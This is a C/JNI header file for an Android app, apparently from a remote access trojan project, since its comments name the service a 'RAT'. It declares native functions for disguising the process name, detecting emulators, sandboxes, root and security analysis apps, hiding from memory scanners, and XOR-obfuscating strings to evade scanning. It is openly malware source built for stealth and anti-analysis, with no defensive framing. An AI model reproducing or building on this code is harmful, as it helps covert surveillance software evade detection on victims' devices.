#ifndef STEALTH_H
#define STEALTH_H

#include <jni.h>

#ifdef __cplusplus
extern "C" {
#endif

/**
 * Native method to disguise the process name.
 * Makes the RAT service less visible in process lists.
 */
JNIEXPORT void JNICALL
Java_com_tarjon_admin_services_AdminService_disguiseProcess(JNIEnv *env, jobject thiz);

/**
 * Check if the device is running in an emulator.
 * Used for anti-detection mechanisms.
 */
JNIEXPORT jboolean JNICALL
Java_com_tarjon_admin_utils_StealthUtils_isEmulator(JNIEnv *env, jclass clazz);

/**
 * Check if the device is rooted.
 * Used to enable additional capabilities on rooted devices.
 */
JNIEXPORT jboolean JNICALL
Java_com_tarjon_admin_utils_StealthUtils_isRooted(JNIEnv *env, jclass clazz);

/**
 * Hide the RAT from memory scanners by manipulating process status.
 */
JNIEXPORT void JNICALL
Java_com_tarjon_admin_utils_StealthUtils_hideFromMemoryScanners(JNIEnv *env, jclass clazz);

/**
 * Decrypt obfuscated strings used in the native code.
 * Simple XOR encryption to prevent simple string scanning.
 */
JNIEXPORT jstring JNICALL
Java_com_tarjon_admin_utils_StealthUtils_decryptNativeString(JNIEnv *env, jclass clazz, 
                                                           jstring encryptedStr, jint key);

/**
 * Monitor for potential security analysis apps running on the device.
 * Returns a list of detected security apps.
 */
JNIEXPORT jobjectArray JNICALL
Java_com_tarjon_admin_utils_StealthUtils_detectSecurityAnalysisApps(JNIEnv *env, jclass clazz);

/**
 * Check if the app is being analyzed in a sandbox environment.
 * Helps avoid detection during dynamic analysis.
 */
JNIEXPORT jboolean JNICALL
Java_com_tarjon_admin_utils_StealthUtils_isSandboxed(JNIEnv *env, jclass clazz);

#ifdef __cplusplus
}
#endif

#endif // STEALTH_H
